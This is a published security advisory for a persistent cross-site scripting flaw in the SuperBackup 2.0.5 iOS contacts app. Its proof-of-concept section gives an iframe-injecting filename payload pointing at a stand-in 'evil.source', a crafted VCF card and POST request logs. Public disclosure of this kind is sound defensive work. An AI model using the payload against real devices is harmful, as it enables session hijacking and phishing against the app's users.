@@ -1,0 +1,306 @@
+# Title: SuperBackup 2.0.5 for iOS - Persistent Cross-Site Scripting
+# Author: Vulnerability Laboratory
+# Date: 2020-04-15
+# Vendor: http://dropouts.in/
+# Software Link: https://apps.apple.com/us/app/super-backup-export-import/id1052684097
+# CVE: N/A
+
+Document Title:
+===============
+SuperBackup v2.0.5 iOS - (VCF) Persistent XSS Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2202
+
+
+Release Date:
+=============
+2020-04-15
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2202
+
+
+Common Vulnerability Scoring System:
+====================================
+4.6
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+500€ - 1.000€
+
+
+Product & Service Introduction:
+===============================
+Backup all your iPhone or iPad contacts in 1 tap and export them.
+Fastest way to restore contacts from PC or Mac.
+Export by mailing the backed up contacts file to yourself. Export
+contacts file to any other app on your device.
+Export all contacts directly to your PC / Mac over Wifi, no software
+needed! Restore any contacts directly from
+PC / Mac. Restore contacts via mail. Get the ultimate contacts backup
+app now.
+
+(Copy of the Homepage:
+https://apps.apple.com/us/app/super-backup-export-import/id1052684097 )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple
+persistent cross site web vulnerabilities in the official SuperBackup
+v2.0.5 ios mobile application.
+
+
+Affected Product(s):
+====================
+Dropouts Technologies LLP
+Product: Super Backup v2.0.5
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-15: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+Pre auth - no privileges
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+A persistent cross site scripting web vulnerability has been discovered
+in the official SuperBackup v2.0.5 ios mobile application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise the mobile
+web-application from the application-side.
+
+The cross site scripting web vulnerabilities are located in the
+`newPath`, `oldPath` & `filename` parameters of the vcf listing module.
+Remote attackers are able to inject own malicious persistent script
+codes as vcf filename to the main index list. The request method to
+inject is POST and the attack vector of the vulnerability is located on
+the application-side. The injection point is located at the vcf
+filename or import. The execution point occurs in the main index list
+after the import or insert.
+
+Remote attackers are able to inject own script codes to the client-side
+requested vulnerable web-application parameters. The attack
+vector of the vulnerability is persistent and the request method to
+inject/execute is POST. The vulnerabilities are classic client-side
+cross site scripting vulnerabilities. Successful exploitation of the
+vulnerability results in session hijacking, persistent phishing
+attacks, persistent external redirects to malicious source and
+persistent manipulation of affected application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] VCF
+
+Vulnerable Parameter(s):
+[+] newPath (path - vcf filename)
+[+] oldPath (path - vcf filename)
+
+
+Proof of Concept (PoC):
+=======================
+The cross site scripting vulnerability can be exploited by remote
+attackers without privileged user account and with low user interaction.
+For security demonstration or to reproduce the cross site scripting
+vulnerability follow the provided information and steps below to continue.
+
+
+PoC: Payload (Filename)
+>"<iframe%20src=evil.source%20onload=alert("PWND")></iframe>
+
+
+PoC: Vulnerable Source (Listing - Index)
+<button type="button" class="btn btn-default btn-xs button-download">
+<span class="glyphicon glyphicon-download-alt"></span>
+</button>
+</td>
+<td class="column-name"><p class="edit" title="Click to
+rename...">Contacts 09:17:12:PM 10:Apr.:2020 .vcf</p></td>
+<td class="column-size">
+<p>26.40 KB</p>
+</td>
+<td class="column-delete">
+<button type="button" class="btn btn-danger btn-xs button-delete">
+<span class="glyphicon glyphicon-trash"></span>
+</button>
+</td>
+</tr></tbody></table>
+</div>
+
+
+PoC: Exception-Handling
+Internal Server Error: Failed moving "/Contacts 09:17:12:PM 10:Apr.:2020
+.vcf"
+to "/Contacts >"<iframe src=evil.source onload=alert("PWND")></iframe>
+09:17:12:PM 10:Apr.:2020 .vcf"
+-
+Internal Server Error: Failed moving "/Contacts 09:17:12:PM 10:Apr.:2020
+.vcf"
+to "/Contacts 09:17:12:PM 10:Apr.:2020 >"<iframe src=evil.source
+onload=alert("PWND")></iframe> .vcf"
+-
+Internal Server Error: Failed moving "/Contacts 09:17:12:PM 10:Apr.:2020
+.vcf"
+to "/Contacts >"<iframe src=evil.source
+onload=alert("PWND")></iframe>09:17:12:PM 10:Apr.:2020 .vcf"
+
+
+PoC: Exploit
+BEGIN:VCARD
+VERSION:3.0
+PRODID:-//Apple Inc.//iPhone OS 12.4.5//EN
+B:Kunz Mejri ;>"<iframe src=evil.source onload=alert("PWND")></iframe> ;;;
+END:VCARD
+
+
+--- PoC Session Logs [POST] ---
+http://localhost/move
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 187
+Origin: http://localhost
+Connection: keep-alive
+Referer: http://localhost/
+oldPath=/Contacts 09:17:12:PM 10:Apr.:2020
+.vcf&newPath=/evil-filename>"<iframe src=evil.source
+onload=alert("PWND")></iframe>.vc
+-
+POST: HTTP/1.1 500 Internal Server Error
+Content-Length: 593
+Content-Type: text/html; charset=utf-8
+Connection: Close
+Server: GCDWebUploader
+-
+http://localhost/evil.source
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://localhost/
+-
+GET: HTTP/1.1 200 OK
+Server: GCDWebUploader
+Connection: Close
+
+
+Solution - Fix & Patch:
+=======================
+1. Parse and filter the vcf name values next to add, edit or imports to
+prevent an execution
+2. Restrict and filter in the index listing the vcf names to sanitize
+the output
+
+
+Security Risk:
+==============
+The security risk of the persistent vcf cross site scripting web
+vulnerability is estimated as medium.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
